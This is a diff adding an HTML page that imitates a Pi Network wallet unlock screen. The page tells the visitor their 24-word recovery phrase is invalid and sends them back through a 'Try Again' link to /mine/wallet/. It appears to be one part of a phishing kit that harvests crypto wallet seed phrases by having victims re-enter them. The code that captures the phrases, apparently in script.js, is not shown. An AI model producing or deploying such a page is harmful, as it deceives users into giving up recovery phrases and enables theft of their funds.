@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Unlock Pi Wallet</title>
+  <style>
+  body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      color: #333;
+    }
+
+    header {
+      background: #783A8D;
+      color: transparent;
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: relative;
+    }
+
+    .back-btn {
+      font-size: 24px;
+      cursor: pointer;
+      color: #783A8D;
+    }
+
+    .header-title {
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      align-items: center;
+      gap: 20px; /* Space between items */
+    }
+
+    .header-icon-left img{
+      width: 25px;
+      height: auto;
+    }
+  
+    .header-icon-right img {
+      width: 40px;
+      height: auto;
+    }
+
+    .wallet-text {
+      font-size: 18px;
+      font-weight: bold;
+      color: white;
+    }
+
+    .header-right {
+      font-size: 20px;
+      color: #783A8D;
+    }
+
+.wallet-container {
+  text-align: center;
+  padding: 2rem 1rem;
+}
+
+.wallet-container h2 {
+  margin-top: 0;
+  font-weight: 600;
+}
+
+.wallet-container p {
+  font-size: 0.7rem;
+  margin: 1rem 0;
+}
+
+button {
+  background-color: #6d29d6;
+  color: white;
+  border: none;
+  padding: 0.75rem 1.5rem;
+  font-size: 0.5rem;
+  border-radius: 10px;
+  cursor: pointer;
+}
+
+button:hover {
+  background-color: #5a22b0;
+}
+
+.note {
+  margin-top: 2rem;
+  font-size: 0.65rem;
+  color: black;
+}
+
+.note a {
+  color: #3f51b5;
+  text-decoration: none;
+}
+
+.note a:hover {
+  text-decoration: underline;
+}
+
+.red-button {
+  background-color: #783A8D;
+  color: white;
+  border: 4px;
+  padding: 10px 20px;
+  font-weight: bold;
+  border-radius: 4px;
+  cursor: pointer;
+      width: 75%;
+      height: 40px;
+}
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-left">
+      <div class="back-btn">&#8592;</div>
+    </div>
+
+    <div class="header-title">
+      <div class="header-icon-left">
+        <img src="../../images/wallet.png" alt="Wallet Icon" />
+      </div>
+      <div class="wallet-text">Wallet</div>
+      <div class="header-icon-right">
+        <img src="../../images/wall.jpg" alt="Pi Icon" />
+      </div>
+    </div>
+
+    <div class="header-right">&#9660;</div>
+  </header>
+
+  <main class="wallet-container">
+    <h2><strong>Unlock Pi Wallet</strong></h2>
+    <p style="font-size: 15px;color: red;"><b>Please provide a valid 24-word phrase to unlock your Pi wallet. The phrase you provided is invalid.</b></p>
+
+      <a href="/mine/wallet/" target="_parent">
+  <button class="red-button">Try Again</button>
+</a>
+
+    <div class="note">
+      <p>
+        As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+      </p>
+      <p>
+        Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
+      </p>
+    </div>
+  </main>
+
+  <script src="script.js"></script>
+</body>
+</html>
